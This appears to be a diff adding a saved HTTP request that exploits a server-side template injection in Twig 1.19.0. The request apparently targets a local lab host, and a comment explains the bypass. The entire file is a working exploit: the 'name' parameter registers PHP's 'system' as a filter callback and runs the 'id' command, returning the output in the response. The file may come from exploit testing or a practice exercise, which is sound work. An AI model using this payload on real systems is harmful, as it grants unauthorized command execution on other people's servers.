@@ -1,0 +1,7 @@
+# Twig 1.19.0 SSTI via POST name param. Single-quoted to bypass htmlspecialchars HTML encoding. Returns command output in response body.
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:52355
+Content-Length: 89
+
+name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
